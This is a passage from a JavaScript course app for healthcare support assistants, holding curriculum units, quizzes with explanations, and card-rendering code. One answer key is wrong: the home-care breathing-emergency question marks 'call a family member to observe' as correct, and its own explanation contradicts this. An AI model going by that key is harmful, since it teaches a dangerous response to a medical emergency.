[\n      {\n        title: "Outline Communicable Diseases",\n        hours: 20,\n        topics: [\n          "Definition: diseases that spread from person to person or via vectors",\n          "Common communicable diseases: TB, HIV/AIDS, malaria, typhoid, cholera",\n          "Modes of transmission: droplet, contact, faeco-oral, vector-borne, bloodborne",\n          "Incubation periods and infectious periods",\n          "Standard precautions and isolation procedures"\n        ],\n        methods: ["Practical","Observation","Written"],\n        quiz: [\n          { q:"Malaria is transmitted through:", opts:["Contaminated water","Direct contact with an infected person","The bite of an infected female Anopheles mosquito","Airborne droplets"], ans:2, exp:"Malaria is transmitted exclusively by the bite of an infected female Anopheles mosquito — it is a vector-borne disease." },\n          { q:"Which mode of transmission spreads TB (tuberculosis)?", opts:["Contaminated food","Airborne droplets when an infected person coughs or sneezes","Insect bites","Direct skin contact"], ans:1, exp:"TB spreads through airborne droplet nuclei produced when an infected person coughs, sneezes or speaks — it requires airborne precautions." }\n        ]\n      },\n      {\n        title: "Outline Non-Communicable Diseases",\n        hours: 20,\n        topics: [\n          "Definition: diseases not directly transmitted between people",\n          "Major NCDs: diabetes, hypertension, cancer, cardiovascular diseases, COPD",\n          "Risk factors: smoking, physical inactivity, unhealthy diet, alcohol, obesity",\n          "Modifiable vs non-modifiable risk factors",\n          "NCD prevention strategies: lifestyle modification, screening"\n        ],\n        methods: ["Practical","Observation","Written"],\n        quiz: [\n          { q:"Which of the following is a NON-communicable disease?", opts:["Cholera","Malaria","Type 2 Diabetes","Tuberculosis"], ans:2, exp:"Type 2 Diabetes is a non-communicable disease caused by lifestyle and genetic factors — it cannot be transmitted from person to person." },\n          { q:"A modifiable risk factor for heart disease is:", opts:["Age","Genetics","Family history","Smoking"], ans:3, exp:"Smoking is a modifiable risk factor — a person can choose to stop smoking, significantly reducing their cardiovascular disease risk." }\n        ]\n      },\n      {\n        title: "Support Common Diseases Management",\n        hours: 40,\n        topics: [\n          "Control measures: vaccination, vector control, water sanitation",\n          "Basic management principles: rest, hydration, medication adherence",\n          "Monitoring disease progression: vital signs, symptom tracking",\n          "Supporting patient adherence to treatment plans",\n          "Reporting notifiable diseases to public health authorities"\n        ],\n        methods: ["Practical","Observation"],\n        quiz: [\n          { q:"Why is medication adherence important in managing TB?", opts:["It is not important","To prevent drug resistance and ensure complete cure","To save money","Only for the first week"], ans:1, exp:"TB requires a full 6-month course of antibiotics — stopping early or missing doses leads to drug-resistant TB strains that are harder to treat." }\n        ]\n      }\n    ]\n  },\n  {\n    module: 2,\n    code: "HW/CU/HSS/CC/02/5/MA",\n    title: "Human Anatomy and Physiology",\n    hours: 100, credits: 10,\n    desc: "Study the organisation, systems, and functions of the human body to support clinical understanding in healthcare.",\n    outcomes: [\n      {\n        title: "Outline Human Body Organization",\n        hours: 10,\n        topics: [\n          "Levels of organisation: cell → tissue → organ → organ system → organism",\n          "Anatomical terms: superior/inferior, anterior/posterior, medial/lateral",\n          "Cell structure and function: nucleus, mitochondria, cell membrane",\n          "Cell cycle: mitosis, growth, division",\n          "Homeostasis: maintaining internal balance (temperature, pH, glucose)"\n        ],\n        methods: ["Observation","Written","Oral","Third Party Report"],\n        quiz: [\n          { q:"What is homeostasis?", opts:["The process of cell division","The body''s ability to maintain a stable internal environment","The study of bones","A type of disease"], ans:1, exp:"Homeostasis is the process by which the body maintains stable internal conditions (temperature, blood pH, glucose) despite external changes." },\n          { q:"The correct order from simplest to most complex biological organisation is:", opts:["Organ → Tissue → Cell → Organism","Cell → Tissue → Organ → Organ System → Organism","Organism → Cell → Tissue → Organ","Tissue → Cell → Organ → Organism"], ans:1, exp:"Biological organisation progresses: cells group into tissues, tissues form organs, organs form organ systems, and systems compose the organism." }\n        ]\n      },\n      {\n        title: "Describe Human Body Fluids Functions",\n        hours: 20,\n        topics: [\n          "Types of body fluids: blood, lymph, cerebrospinal fluid, synovial fluid",\n          "Functions: transport of nutrients, waste removal, lubrication, immunity",\n          "Electrolytes: sodium, potassium, calcium, chloride — roles and balance",\n          "Fluid compartments: intracellular vs extracellular",\n          "Dehydration and overhydration: causes and signs"\n        ],\n        methods: ["Observation","Written","Oral","Third Party Report"],\n        quiz: [\n          { q:"What is the primary electrolyte found in extracellular fluid?", opts:["Potassium","Sodium","Calcium","Magnesium"], ans:1, exp:"Sodium is the predominant extracellular cation — it regulates fluid balance, nerve transmission and muscle function." },\n          { q:"Signs of dehydration in a patient include:", opts:["Pale, moist skin and frequent urination","Dark concentrated urine, dry mouth, sunken eyes and decreased skin turgor","Excessive urination and cool skin","Oedema and weight gain"], ans:1, exp:"Dehydration signs include dark urine, dry mucous membranes, sunken eyes, decreased skin turgor, confusion and reduced urine output." }\n        ]\n      },\n      {\n        title: "Outline Human Body Tissues and Membranes",\n        hours: 10,\n        topics: [\n          "Four tissue types: epithelial, connective, muscle, nervous",\n          "Epithelial tissue: covering and lining body surfaces, glands",\n          "Connective tissue: bone, blood, cartilage, adipose, tendons",\n          "Muscle tissue: skeletal (voluntary), cardiac, smooth (involuntary)",\n          "Nervous tissue: neurons and glial cells — transmission of signals"\n        ],\n        methods: ["Written","Oral","Observation","Third Party Report"],\n        quiz: [\n          { q:"Which type of muscle tissue is found in the heart?", opts:["Skeletal muscle","Smooth muscle","Cardiac muscle","Epithelial tissue"], ans:2, exp:"Cardiac muscle is unique to the heart — it is involuntary, striated and contracts rhythmically without fatigue under normal conditions." }\n        ]\n      },\n      {\n        title: "Outline Human Body Cavities and Functions",\n        hours: 10,\n        topics: [\n          "Dorsal cavity: cranial (brain) and spinal (spinal cord)",\n          "Ventral cavity: thoracic (lungs, heart) and abdominopelvic (organs)",\n          "Membranes: pleura (lungs), pericardium (heart), peritoneum (abdomen)",\n          "Protective functions of body cavities",\n          "Clinical significance: understanding cavity location for assessments"\n        ],\n        methods: ["Oral","Observation","Written","Third Party Report"],\n        quiz: [\n          { q:"Which body cavity contains the heart and lungs?", opts:["Cranial cavity","Abdominal cavity","Thoracic cavity","Pelvic cavity"], ans:2, exp:"The thoracic (chest) cavity contains the heart, lungs and major blood vessels — it is protected by the rib cage." }\n        ]\n      },\n      {\n        title: "Describe Human Body Systems Functions",\n        hours: 40,\n        topics: [\n          "Musculoskeletal: 206 bones, 640+ muscles, types of joints and their functions",\n          "Circulatory: heart, blood vessels, blood — transport and immune functions",\n          "Respiratory: lungs, airways — gas exchange (O₂ in, CO₂ out)",\n          "Digestive: mouth to anus — digestion, absorption, elimination",\n          "Nervous system: brain, spinal cord, neurons — control and coordination",\n          "Endocrine: hormones and glands — long-term regulatory control",\n          "Urinary system: kidneys — filtration and urine production",\n          "Reproductive system: male and female structures and fertilisation"\n        ],\n        methods: ["Written","Oral","Observation","Third Party Report"],\n        quiz: [\n          { q:"The primary organ of gas exchange in the respiratory system is:", opts:["The heart","The trachea","The lungs (alveoli)","The diaphragm"], ans:2, exp:"Gas exchange occurs in the alveoli of the lungs — oxygen diffuses into blood and carbon dioxide diffuses out, driven by concentration gradients." },\n          { q:"The main organ responsible for filtering blood and producing urine is:", opts:["The liver","The kidneys","The spleen","The bladder"], ans:1, exp:"The kidneys filter approximately 200 litres of blood daily, removing waste products, excess electrolytes and water, producing urine." },\n          { q:"Which hormone, produced by the pancreas, lowers blood glucose levels?", opts:["Glucagon","Cortisol","Insulin","Adrenaline"], ans:2, exp:"Insulin, produced by beta cells in the pancreatic islets of Langerhans, stimulates cells to take up glucose, lowering blood sugar levels." }\n        ]\n      }\n    ]\n  },\n  {\n    module: 2,\n    code: "HW/CU/HSS/CR/04/5/MA",\n    title: "Hospital Store Procedures",\n    hours: 100, credits: 10,\n    desc: "Manage hospital procurement, inventory, supplies distribution, mortuary activities and store documentation procedures.",\n    outcomes: [\n      {\n        title: "Support Hospital Procurement Procedure",\n        hours: 14,\n        topics: [\n          "Protective gear requirements during procurement activities",\n          "Types of medical supplies: consumables, pharmaceuticals, equipment",\n          "Procurement process: requisition, approval, ordering, receiving",\n          "Dispatch documentation: delivery notes, goods received notes",\n          "Supplier verification and quality checks on delivery"\n        ],\n        methods: ["Written Tests","Oral Presentations","Observation","Practical","Demonstrations"],\n        quiz: [\n          { q:"What document confirms that goods have been received in good condition from a supplier?", opts:["Purchase order","Invoice","Goods Received Note (GRN)","Prescription"], ans:2, exp:"A Goods Received Note (GRN) documents that goods have been delivered and inspected — it is essential for inventory management and payment processing." }\n        ]\n      },\n      {\n        title: "Support Inventory and Storage Procedures",\n        hours: 20,\n        topics: [\n          "Inventory management: FIFO (first in, first out) principle",\n          "Stock cards and inventory management systems",\n          "Proper storage: temperature, light, humidity requirements",\n          "Handling expired and unwanted supplies: disposal procedures",\n          "Cold chain management for temperature-sensitive products"\n        ],\n        methods: ["Written Tests","Oral Presentations","Observation","Practical","Demonstrations"],\n        quiz: [\n          { q:"The FIFO principle in hospital stores means:", opts:["Fastest Items First Out","First In, First Out — oldest stock used before new stock","Fill In, Fill Out","First Issued, Final Output"], ans:1, exp:"FIFO ensures that the oldest stock is used first, preventing expiry and waste — critical for pharmaceuticals and consumables." },\n          { q:"What should be done with expired medical supplies?", opts:["Redistribute to patients","Stored alongside current stock","Quarantined, documented and disposed of per regulations","Returned to suppliers without documentation"], ans:2, exp:"Expired supplies must be removed from active stock immediately, documented and disposed of according to health regulatory guidelines to prevent patient harm." }\n        ]\n      },\n      {\n        title: "Support Last Offices (Mortuary) Activities",\n        hours: 30,\n        topics: [\n          "PPE requirements in the mortuary: gown, gloves, goggles, mask",\n          "Procedure for receiving a deceased body: documentation, identity verification",\n          "Body preparation: cleaning, embalming (arterial and cavity)",\n          "Post-mortem procedures and documentation",\n          "Mortuary waste segregation and disposal methods"\n        ],\n        methods: ["Written Tests","Oral Presentations","Observation","Practical"],\n        quiz: [\n          { q:"Why is identity verification critical when receiving a deceased body in the mortuary?", opts:["Standard procedure only","To prevent mix-up of bodies and ensure the correct family receives their loved one","For billing purposes only","It is not important"], ans:1, exp:"Identity verification prevents body mix-ups, which cause significant distress to families and have legal and ethical implications." }\n        ]\n      }\n    ]\n  },\n  {\n    module: 2,\n    code: "HW/CU/HSS/CR/02/5/MA",\n    title: "Infection Prevention and Control",\n    hours: 120, credits: 8,\n    desc: "Apply infection prevention and control measures including PPE use, sterilisation, waste management and pest control in healthcare.",\n    outcomes: [\n      {\n        title: "Wear Personal Protective Equipment",\n        hours: 10,\n        topics: [\n          "Types of PPE: gloves, masks, gowns, goggles, aprons, shoe covers",\n          "Correct donning (putting on) sequence for PPE",\n          "Correct doffing (removing) sequence: gloves first, then gown, then mask",\n          "Hand hygiene: WHO 6-step handwashing technique",\n          "Maintaining hand hygiene: alcohol-based rubs vs soap and water"\n        ],\n        methods: ["Portfolio Assessment","Interview","Case Studies","Practical","Observation","Written"],\n        quiz: [\n          { q:"In the WHO 6-step handwashing technique, which area is most often missed?", opts:["Palms","Fingertips and thumbs","Wrists","Back of hands"], ans:1, exp:"Studies consistently show fingertips and thumbs are most commonly missed — these areas carry the most pathogenic organisms and must be scrubbed thoroughly." },\n          { q:"When removing PPE after patient care, what should be removed FIRST?", opts:["Mask","Gown","Gloves","Goggles"], ans:2, exp:"Gloves are the most contaminated item and must be removed first using the glove-in-glove technique, before removing the gown and then the mask." }\n        ]\n      },\n      {\n        title: "Perform Safety Practices",\n        hours: 20,\n        topics: [\n          "Sharps disposal: never recap needles, immediate disposal into sharps containers",\n          "Types of hospital hazards: biological, chemical, physical, psychological",\n          "Hospital waste categories: general, clinical, sharps, pharmaceutical",\n          "Hospital waste segregation: colour-coded bins (yellow, red, black, blue)",\n          "Universal safety precautions: treat all blood/body fluids as potentially infectious"\n        ],\n        methods: ["Practical","Observation","Written"],\n        quiz: [\n          { q:"The principle of ''Universal Precautions'' means:", opts:["Only wear PPE for known HIV patients","Treat ALL patients'' blood and body fluids as potentially infectious","Only wash hands after procedures","Use PPE only in surgery"], ans:1, exp:"Universal precautions treat every patient''s blood and body fluids as potentially infectious — this protects healthcare workers regardless of a patient''s diagnosis." },\n          { q:"Which colour bin should infectious/clinical waste be placed in?", opts:["Black","Green","Yellow","Blue"], ans:2, exp:"Yellow bins are used for infectious/clinical waste in Kenya and most healthcare settings — they are incinerated or treated before disposal." }\n        ]\n      },\n      {\n        title: "Carry Out Autoclaving Procedure",\n        hours: 20,\n        topics: [\n          "Autoclaving principle: steam under pressure kills all microorganisms including spores",\n          "Standard autoclave settings: 134°C at 2.1 bar for 3 minutes (or 121°C for 15 minutes)",\n          "Loading the autoclave: correct packaging, spacing, indicator strips",\n          "Interpreting autoclave indicators: autoclave tape, Bowie-Dick test",\n          "Documentation of each autoclave cycle"\n        ],\n        methods: ["Practical","Observation"],\n        quiz: [\n          { q:"What does autoclave tape indicate after a sterilisation cycle?", opts:["The items are expired","Chemical indicators confirm the items were exposed to steam sterilisation conditions","The autoclave is broken","Items need to be re-sterilised"], ans:1, exp:"Autoclave tape changes pattern/colour when exposed to the steam and heat of sterilisation — it indicates exposure but does not guarantee sterility (process indicators)." }\n        ]\n      },\n      {\n        title: "Manage Hospital Waste",\n        hours: 20,\n        topics: [\n          "Types of hospital waste: sharps, pathological, pharmaceutical, general, radioactive",\n          "Waste segregation at point of generation: correct bin selection",\n          "Storage requirements: secure, labelled, appropriate containers",\n          "Safe transportation of waste within and from the facility",\n          "Disposal methods: incineration, autoclaving, landfill, chemical treatment"\n        ],\n        methods: ["Portfolio Assessment","Case Studies","Practical","Observation"],\n        quiz: [\n          { q:"The best method for disposing of sharps waste (needles, blades) is:", opts:["General waste bin","Incineration after collection in puncture-resistant sharps containers","Down the drain","Burying on site"], ans:1, exp:"Sharps must be collected in puncture-resistant containers and ultimately incinerated — this prevents needle-stick injuries and environmental contamination." }\n        ]\n      }\n    ]\n  },\n\n  // MODULE IV\n  {\n    module: 3,\n    code: "HW/CU/HSS/BC/03/5/MA",\n    title: "Work Ethics and Practices",\n    hours: 40, credits: 4,\n    desc: "Demonstrate self-management, promote ethical work practices, teamwork, professional development and customer care.",\n    outcomes: [\n      {\n        title: "Apply Self-Management Skills",\n        hours: 10,\n        topics: [\n          "Self-awareness: identifying personal values, strengths and limitations",\n          "Formulating personal vision, mission and SMART goals",\n          "Emotional intelligence: managing stress and building resilience",\n          "Time management: prioritisation, scheduling, avoiding procrastination",\n          "Healthy lifestyle practices supporting wellbeing and productivity"\n        ],\n        methods: ["Practical","Portfolio of Evidence","Third Party Report","Written Tests","Oral Tests"],\n        quiz: [\n          { q:"SMART goals must be:", opts:["Short, Manageable, Active, Regular, Timed","Specific, Measurable, Achievable, Relevant, Time-bound","Simple, Meaningful, Actionable, Reviewed, Tracked","Shared, Motivated, Agreed, Resourced, Targeted"], ans:1, exp:"SMART goals are Specific, Measurable, Achievable, Relevant and Time-bound — this framework ensures goals are realistic and progress can be tracked." }\n        ]\n      },\n      {\n        title: "Promote Ethical Work Practices and Values",\n        hours: 4,\n        topics: [\n          "Core values: integrity, honesty, respect, professionalism, accountability",\n          "Patriotism and national identity in healthcare service",\n          "Organisational codes of conduct and professional boundaries",\n          "Consequences of unethical behaviour: disciplinary action, legal implications",\n          "Whistleblowing: reporting unethical practices responsibly"\n        ],\n        methods: ["Practical","Portfolio of Evidence","Third Party Report","Written Tests","Oral Tests"],\n        quiz: [\n          { q:"Integrity in the workplace means:", opts:["Doing what is right only when being watched","Consistently acting with honesty, transparency and adherence to ethical principles","Following orders regardless of ethics","Maximising personal gain"], ans:1, exp:"Integrity means acting ethically consistently — whether observed or not — and it is foundational to trust in healthcare relationships." }\n        ]\n      },\n      {\n        title: "Promote Teamwork",\n        hours: 10,\n        topics: [\n          "Types of teams in healthcare: multidisciplinary, interdisciplinary teams",\n          "Stages of team development: forming, storming, norming, performing",\n          "Individual roles and responsibilities within the team",\n          "Conflict resolution: negotiation, mediation, compromise",\n          "Gender and diversity mainstreaming in healthcare teams"\n        ],\n        methods: ["Practical","Portfolio of Evidence","Third Party Report","Written Tests","Oral Tests"],\n        quiz: [\n          { q:"A multidisciplinary team (MDT) in healthcare typically includes:", opts:["Only doctors","Only nurses","Professionals from multiple disciplines working together for patient care","Only administrators"], ans:2, exp:"An MDT includes professionals from different disciplines (doctors, nurses, physiotherapists, dietitians, social workers etc.) collaborating to provide comprehensive patient care." }\n        ]\n      },\n      {\n        title: "Promote Customer Care",\n        hours: 2,\n        topics: [\n          "Identifying patient/customer needs and expectations",\n          "Qualities of excellent customer service: empathy, responsiveness, reliability",\n          "Handling patient complaints professionally",\n          "Patient feedback methods: surveys, suggestion boxes, face-to-face",\n          "Customer retention strategies in healthcare"\n        ],\n        methods: ["Practical","Portfolio of Evidence","Third Party Report","Written Tests","Oral Tests"],\n        quiz: [\n          { q:"When a patient makes a complaint, the FIRST appropriate response is:", opts:["Dismiss the complaint","Defend the staff member involved","Listen actively, acknowledge their concern and apologise for any inconvenience","Escalate immediately without listening"], ans:2, exp:"Effective complaint handling begins with active listening and genuine acknowledgement — patients need to feel heard before solutions can be offered." }\n        ]\n      }\n    ]\n  },\n  {\n    module: 3,\n    code: "HW/CU/HSS/BC/04/5/MA",\n    title: "Entrepreneurial Skills",\n    hours: 40, credits: 4,\n    desc: "Apply financial literacy, entrepreneurial concepts, business legal aspects and develop a business plan for healthcare services.",\n    outcomes: [\n      {\n        title: "Apply Financial Literacy",\n        hours: 6,\n        topics: [\n          "Personal finance: budgeting, saving, debt management",\n          "Sources of business funds: equity, debt, grants, crowdfunding",\n          "Investment decisions: types of investments and risk assessment",\n          "Insurance products: health, life, business insurance",\n          "Budget preparation and financial planning tools"\n        ],\n        methods: ["Observation","Project","Written Assessment","Oral Assessment","Third Party Report"],\n        quiz: [\n          { q:"What is the purpose of a personal budget?", opts:["To impress a bank","To track income and expenses, control spending and achieve savings goals","Only for businesses","Required by law"], ans:1, exp:"A budget tracks income versus expenditure, helping individuals allocate money purposefully, avoid debt and save towards goals." }\n        ]\n      },\n      {\n        title: "Develop a Business Plan",\n        hours: 12,\n        topics: [\n          "Business description: what the business does, location, mission",\n          "Market analysis: target customers, competitors, market size",\n          "Marketing plan: pricing, promotion, distribution channels",\n          "Financial plan: startup costs, revenue projections, break-even analysis",\n          "Executive summary: compelling overview for investors"\n        ],\n        methods: ["Observation","Written Assessment","Project","Oral Assessment","Third Party Report"],\n        quiz: [\n          { q:"The executive summary in a business plan should be:", opts:["The longest section","Written last but placed first — a concise overview of the entire plan","Skipped for small businesses","Just a financial table"], ans:1, exp:"The executive summary is written last (to accurately reflect the full plan) but placed first — it is the critical ''hook'' that persuades investors to read further." }\n        ]\n      }\n    ]\n  },\n  {\n    module: 3,\n    code: "HW/CU/HSS/CC/03/5/MA",\n    title: "Medical Legal Ethics",\n    hours: 60, credits: 6,\n    desc: "Apply medical-legal principles, maintain professional appearance and apply professional ethics in healthcare support services.",\n    outcomes: [\n      {\n        title: "Maintain Professional Appearance",\n        hours: 40,\n        topics: [\n          "Definition and importance of medical-legal issues in healthcare",\n          "Key ethical issues in health: autonomy, beneficence, non-maleficence, justice",\n          "Roles and responsibilities of a Healthcare Support Services Professional (HSSP)",\n          "Sources of law: statutory law, common law, regulations",\n          "Employment law: contracts, rights, dismissal, disciplinary procedures"\n        ],\n        methods: ["Written","Oral","Observation","Third Party Report"],\n        quiz: [\n          { q:"The ethical principle of ''non-maleficence'' means:", opts:["Do good for the patient","Do no harm to the patient","Respect patient autonomy","Treat all patients fairly"], ans:1, exp:"Non-maleficence — from ''primum non nocere'' (first, do no harm) — requires healthcare workers to avoid actions that cause unnecessary harm." },\n          { q:"Patient ''autonomy'' in medical ethics means:", opts:["The doctor makes all decisions","The patient has the right to make informed decisions about their own care","Only specialists decide on care","Family members decide for patients"], ans:1, exp:"Autonomy respects each patient''s right to make informed decisions about their own care, treatment and body — central to ethical healthcare practice." }\n        ]\n      },\n      {\n        title: "Apply Professional Ethics",\n        hours: 20,\n        topics: [\n          "Components of professional ethics: honesty, loyalty, accountability, respect",\n          "Patient rights: right to information, privacy, dignity, consent",\n          "Documentation and patient information management: confidentiality",\n          "Health facility protocols: dress code, punctuality, scope of practice",\n          "Universal professional ethics and professional obligations"\n        ],\n        methods: ["Written","Oral","Observation","Third Party Report"],\n        quiz: [\n          { q:"What is ''informed consent'' in healthcare?", opts:["Patient signs a form without explanation","A patient''s voluntary agreement to a procedure after receiving and understanding relevant information","Only required for surgery","Family consents on behalf of all patients"], ans:1, exp:"Informed consent requires that a patient voluntarily agrees to treatment or procedures after receiving complete, understandable information about benefits, risks and alternatives." }\n        ]\n      }\n    ]\n  },\n  {\n    module: 3,\n    code: "HW/OS/HSS/CR/01/5/MA",\n    title: "Health Facility Procedures",\n    hours: 100, credits: 10,\n    desc: "Understand health facility set-up, use medical equipment, apply patient care procedures and implement healthcare assistant administrative functions.",\n    outcomes: [\n      {\n        title: "Outline Health Facility Set Up",\n        hours: 10,\n        topics: [\n          "Types of departments: OPD, emergency, surgical, medical, maternity, ICU, mortuary",\n          "Levels of health facilities in Kenya: dispensary, health centre, sub-district, district, county, national referral",\n          "Management structure: administrative and clinical hierarchy",\n          "Health facility layout: patient flow, signage, zoning",\n          "Specialised units: dialysis, oncology, neonatal ICU, burns unit"\n        ],\n        methods: ["Observation","Written","Oral","Third Party Report"],\n        quiz: [\n          { q:"At which level of Kenya''s health system would a patient with a complex condition be referred to for specialist care?", opts:["Dispensary","Health Centre","County Referral Hospital or National Referral Hospital","Community health post"], ans:2, exp:"Complex cases requiring specialist intervention are referred up the referral chain to county or national referral hospitals where specialist services exist." }\n        ]\n      },\n      {\n        title: "Use Medical Equipment for Basic Patient Care",\n        hours: 20,\n        topics: [\n          "Blood pressure machine: types (manual, digital), proper cuff placement, reading",\n          "Thermometers: types (oral, axillary, tympanic, rectal), normal ranges",\n          "Weighing machines: calibration, correct use, recording weight",\n          "Pulse oximeter: measuring oxygen saturation and pulse rate",\n          "Equipment care and maintenance: cleaning, calibration, reporting faults"\n        ],\n        methods: ["Observation","Written","Oral","Third Party Report"],\n        quiz: [\n          { q:"A normal blood pressure reading for an adult is approximately:", opts:["160/100 mmHg","90/60 mmHg","120/80 mmHg","200/120 mmHg"], ans:2, exp:"120/80 mmHg is the standard normal adult blood pressure. Above 140/90 is hypertension; below 90/60 may indicate hypotension." },\n          { q:"A pulse oximeter measures:", opts:["Blood glucose level","Blood pressure","Oxygen saturation in the blood and pulse rate","Body temperature"], ans:2, exp:"A pulse oximeter uses infrared light to measure peripheral oxygen saturation (SpO₂) and heart rate — normal SpO₂ is 95–100%." }\n        ]\n      },\n      {\n        title: "Apply Basic Patient Care Procedures",\n        hours: 20,\n        topics: [\n          "Patient triaging: 5-level triage system (immediate, urgent, semi-urgent, non-urgent, deceased)",\n          "Client flow management in outpatient and emergency settings",\n          "Decontamination of medical equipment after patient use",\n          "Waste segregation at point of care and disposal",\n          "Patient registration, documentation and record keeping"\n        ],\n        methods: ["Oral Questions","Observation","Written Test","Third Party Report"],\n        quiz: [\n          { q:"In a 5-level triage system, a patient with a life-threatening emergency (e.g., cardiac arrest) would be categorised as:", opts:["Non-urgent (green)","Semi-urgent (blue)","Urgent (orange)","Immediate (red)"], ans:3, exp:"Immediate (red) triage category is for life-threatening conditions requiring immediate intervention — these patients are seen first." }\n        ]\n      },\n      {\n        title: "Implement Administrative Functions of HSAs",\n        hours: 10,\n        topics: [\n          "Scope of practice for Healthcare Support Assistants (HSAs)",\n          "Administrative duties: scheduling, filing records, reception",\n          "Role of HSAs in Kenya''s and global health and care support system",\n          "Inter-cadre relationships: working alongside nurses, clinicians, allied health staff",\n          "Legal aspects: scope of practice boundaries, professional liability"\n        ],\n        methods: ["Oral Questions","Observation","Written Test","Third Party Report"],\n        quiz: [\n          { q:"Why is it important for a Healthcare Support Assistant to stay within their defined scope of practice?", opts:["To avoid extra work","To protect patient safety and avoid legal and professional liability","To earn more money","Scope of practice is not important"], ans:1, exp:"Working within scope of practice ensures patient safety, maintains professional standards and protects the worker from legal liability for acts beyond their training and authorisation." }\n        ]\n      }\n    ]\n  },\n  {\n    module: 3,\n    code: "HW/OS/HSS/CR/03/5/MA",\n    title: "Patient Care Support",\n    hours: 200, credits: 20,\n    desc: "Support outpatient and inpatient services, patient triaging, admission, in-patient care activities, discharge and home-based care.",\n    outcomes: [\n      {\n        title: "Support Outpatient Services",\n        hours: 40,\n        topics: [\n          "Types of OPD services: general outpatient, specialist clinics, preventive health",\n          "Sources and types of outpatients: walk-in, referred, emergency",\n          "OPD workflow: registration → triage → consultation → treatment → pharmacy → discharge",\n          "Organisation and management of inpatient vs outpatient services",\n          "Patient flow management and minimising waiting times"\n        ],\n        methods: [],\n        quiz: [\n          { q:"What is the typical first step when a patient arrives at an outpatient department?", opts:["Immediate medical examination","Registration and patient file retrieval","Surgery preparation","Admission to a ward"], ans:1, exp:"Registration is the first step in OPD — patient details are recorded, files retrieved and the patient enters the clinical pathway for assessment and treatment." }\n        ]\n      },\n      {\n        title: "Support Patient Admission Procedure",\n        hours: 20,\n        topics: [\n          "Types of admission: emergency, elective, day case, compulsory",\n          "Admission procedure: consent, documentation, orientation to ward",\n          "Preparing the admission unit/ward: clean, equipped, ready bed",\n          "Transferring patient from OPD to ward: handing over documentation",\n          "Patient orientation: ward layout, call bell, visiting hours, rights"\n        ],\n        methods: [],\n        quiz: [\n          { q:"What document accompanies a patient when transferred from OPD to the ward?", opts:["Birth certificate","Transfer/Referral form with clinical notes","Passport","Payment receipt only"], ans:1, exp:"A transfer form containing the patient''s assessment findings, diagnosis and treatment plan is sent with the patient to ensure continuity of care in the ward." }\n        ]\n      },\n      {\n        title: "Support In-Patient Care Activities",\n        hours: 60,\n        topics: [\n          "Patient hygiene: bathing, oral care, perineal care, nail/hair care",\n          "Vital signs measurement: temperature, pulse, blood pressure, respiratory rate, SpO₂",\n          "Patient comfort: physical, psychological, social and environmental",\n          "Wound dressing: assessment, selection of materials, safe technique",\n          "Bed making: unoccupied, occupied and post-operative beds",\n          "Tube feeding: purposes, indications and procedure",\n          "Specimen collection: types, handling and transportation"\n        ],\n        methods: [],\n        quiz: [\n          { q:"What are the four main vital signs routinely measured in patient care?", opts:["Weight, height, BMI, age","Temperature, Pulse, Blood Pressure, Respiratory Rate","Blood sugar, cholesterol, urine output, weight","Skin colour, posture, gait, speech"], ans:1, exp:"The four primary vital signs are Temperature, Pulse, Blood Pressure and Respiratory Rate — collectively they reflect the body''s basic physiological functioning." },\n          { q:"Perineal care is important to prevent:", opts:["Pressure ulcers on the back","Urinary tract infections and skin breakdown in the genital area","Respiratory complications","Eye infections"], ans:1, exp:"Regular perineal care removes urine and faecal matter from the perineal area, preventing skin breakdown and urinary tract infections — especially in incontinent patients." }\n        ]\n      },\n      {\n        title: "Support Patient Discharge Process",\n        hours: 10,\n        topics: [\n          "Types of discharge: medical discharge, self-discharge (AMA), transfer to another facility",\n          "Discharge preparation: education, medication teaching, follow-up appointments",\n          "Discharge documentation: discharge summary, prescription, sick leave certificate",\n          "Discharge instructions: activity restrictions, diet, wound care, red flag symptoms",\n          "Ensuring safe transport and adequate home support"\n        ],\n        methods: [],\n        quiz: [\n          { q:"What is the purpose of discharge instructions given to a patient?", opts:["To end the nurse-patient relationship","To guide the patient''s recovery at home and prevent readmission","Only for hospital records","Required only for elderly patients"], ans:1, exp:"Discharge instructions provide patients with clear guidance on medication, activity, diet, wound care and warning signs — reducing readmission rates and promoting recovery." }\n        ]\n      },\n      {\n        title: "Perform Home Based Patient Care",\n        hours: 30,\n        topics: [\n          "Types of home-based care: chronic disease management, post-surgical, palliative",\n          "Assessing the home environment for safety and suitability",\n          "Required services: medication management, wound care, physiotherapy support",\n          "Maintaining a healthy home-based patient care environment",\n          "Recognising and responding to danger signs during home care visits"\n        ],\n        methods: [],\n        quiz: [\n          { q:"A patient on home-based care develops sudden difficulty breathing. What should the care worker do?", opts:["Continue the visit as planned","Call a family member to observe","Immediately contact emergency services and stay with the patient","Document it in the next monthly report"], ans:1, exp:"Sudden difficulty breathing is a medical emergency — immediate activation of emergency services (999/112 or nearest ambulance) is the priority while staying with the patient." }\n        ]\n      }\n    ]\n  }\n];\n\n// MODULE COLOUR SCHEMES\nconst modColours = [\n  { tab: ''#1a7a6e'', card: ''#0d7377'' },\n  { tab: ''#1a4a7a'', card: ''#1a4a9a'' },\n  { tab: ''#7a1a6e'', card: ''#9a1a8e'' },\n  { tab: ''#7a4a1a'', card: ''#9a6a1a'' }\n];\n\n// RENDER CARDS\nfunction renderCards() {\n  [0,1,2,3].forEach(m => {\n    const container = document.getElementById(`mod${m}-cards`);\n    units.filter(u => u.module === m).forEach((unit, i) => {\n      const card = document.createElement(''div'');\n      card.className = ''unit-card'';\n      card.style.setProperty(''--card-color'', modColours[m].card);\n      card.querySelector && null;\n      card.innerHTML = `\n        <div class="unit-code">${unit.code}</div>\n        <h3>${unit.title}</h3>\n        <p>${unit.desc}</p>\n        <div class="card-meta">\n          <span class="badge hours">⏱ ${unit.hours} hrs</span>\n          <span class="badge outcomes">📋 ${unit.outcomes.length} outcomes</span>\n          <button class="btn-start" onclick="openLesson(${units.indexOf(unit)})">Start Lesson →</button>\n        </div>\n      `;\n      card.querySelector(''.unit-code'') && (card.querySelector(''*[style]'') || card).style.setProperty;\n      container.appendChild(card);\n    });\n  });\n}\n\nfunction showModule(idx) {\n  document.querySelectorAll(''.cards-section'').forEach(s => s.classList.remove(''active''));\n  document.querySelectorAll(''.module-tab'').forEach(t => t.classList.remove(''active''));\n  document.getElementById(`mod${idx}`).classList.add(''active'');\n  document.querySelectorAll(''.module-tab'')[idx].classList.add(''active'');\n}\n\nfunction openLesson(idx) {\n  const unit = units[idx];\n  document.getElementById(''home'').style.display = ''none'';\n  const lv = document.getElementById(''lesson-view'');\n  lv.classList.add(''active'');\n\n  let outcomeButtons = unit.outcomes.map((o, i) 